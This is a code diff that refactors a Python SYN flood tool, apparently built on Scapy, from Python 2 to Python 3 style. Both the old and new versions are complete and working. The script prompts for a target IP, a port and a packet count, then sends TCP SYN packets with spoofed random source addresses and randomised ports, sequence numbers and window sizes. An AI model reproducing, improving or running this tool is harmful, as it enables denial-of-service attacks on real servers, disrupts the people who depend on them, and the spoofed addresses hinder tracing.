@@ -3,53 +3,43 @@ import os
 import sys
 import random
 
-def randomIP():
-	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-	return ip
+def random_ip():
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 
-def randInt():
-	x = random.randint(1000,9000)
-	return x	
+def rand_int():
+    return random.randint(1000, 9000)
 
-def SYN_Flood(dstIP,dstPort,counter):
-	total = 0
-	print ("Packets are sending ...")
-	for x in range (0,counter):
-		s_port = randInt()
-		s_eq = randInt()
-		w_indow = randInt()
+def syn_flood(dst_ip, dst_port, counter):
+    total = 0
+    print("Packets are sending ...")
+    for _ in range(counter):
+        s_port = rand_int()
+        s_eq = rand_int()
+        w_indow = rand_int()
 
-		IP_Packet = IP ()
-		IP_Packet.src = randomIP()
-		IP_Packet.dst = dstIP
+        ip_packet = IP(src=random_ip(), dst=dst_ip)
+        tcp_packet = TCP(sport=s_port, dport=dst_port, flags="S", seq=s_eq, window=w_indow)
 
-		TCP_Packet = TCP ()	
-		TCP_Packet.sport = s_port
-		TCP_Packet.dport = dstPort
-		TCP_Packet.flags = "S"
-		TCP_Packet.seq = s_eq
-		TCP_Packet.window = w_indow
+        send(ip_packet / tcp_packet, verbose=0)
+        total += 1
 
-		send(IP_Packet/TCP_Packet, verbose=0)
-		total+=1
-	sys.stdout.write("\nTotal packets sent: %i\n" % total)
+    print(f"\nTotal packets sent: {total}\n")
 
+def get_info():
+    os.system("clear")
+    print("#############################")
+    print("# Welcome to SYN Flood Tool #")
+    print("#############################")
 
-def info():
-	os.system("clear")
-	print ("#############################")
-	print ("# Welcome to SYN Flood Tool #")
-	print ("#############################")
-
-	dstIP = raw_input ("\nTarget IP : ")
-	dstPort = input ("Target Port : ")
-	
-	return dstIP,int(dstPort)
-	
+    dst_ip = input("\nTarget IP : ")
+    dst_port = int(input("Target Port : "))
+    
+    return dst_ip, dst_port
 
 def main():
-	dstIP,dstPort = info()
-	counter = input ("How many packets do you want to send : ")
-	SYN_Flood(dstIP,dstPort,int(counter))
+    dst_ip, dst_port = get_info()
+    counter = int(input("How many packets do you want to send : "))
+    syn_flood(dst_ip, dst_port, counter)
 
-main()
+if __name__ == "__main__":
+    main()
